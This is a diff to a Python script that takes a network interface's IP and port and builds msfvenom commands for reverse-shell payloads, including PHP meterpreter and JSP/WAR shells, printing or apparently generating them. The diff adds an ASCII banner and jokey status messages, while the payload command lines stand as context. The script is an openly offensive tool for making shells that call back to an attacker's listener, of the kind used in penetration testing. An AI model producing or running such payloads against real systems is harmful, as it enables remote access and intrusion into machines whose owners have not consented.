@@ -3,6 +3,22 @@ import sys
 import netifaces as ni
 import sys
 
+bann = """
+
+           _.-''|''-._
+        .-'     |     `-.
+      .'\       |       /`.
+    .'   \      |      /   `.
+    \     \     |     /     /
+     `\    \    |    /    /'
+       `\   \   |   /   /'
+         `\  \  |  /  /'
+        _.-`\ \ | / /'-._
+       {_____`\\|//'_____}
+               `-'
+"""
+print(bann)
+
 if len(sys.argv) != 3:
     print("Syntax: {} <interface name> <type>".format(sys.argv[0]))
     print("Type 1: spits out commands.")
@@ -34,8 +50,11 @@ shell_list.append("msfvenom -p php/meterpreter_reverse_tcp LHOST={} LPORT={} -f 
 
 shell_list.append("msfvenom -p java/jsp_shell_reverse_tcp LHOST={} LPORT={} -f raw > war_met_{}_{}.war".format(this_ip,this_port, this_ip, this_port))
 
-print("# shells == {}".format(len(shell_list)))
-print("Run type is {}\n\n".format(run_type))
+print("\tSHELLCOME TO SHELL.\n")
+
+type_strang = ["  [ We are doing commands only! ]","  [ Let's make some bloody shells! ]"]
+print(type_strang[run_type-1])
+print("\n\n")
 
 for shell in shell_list:
     print("COMMAND: {}".format(shell))
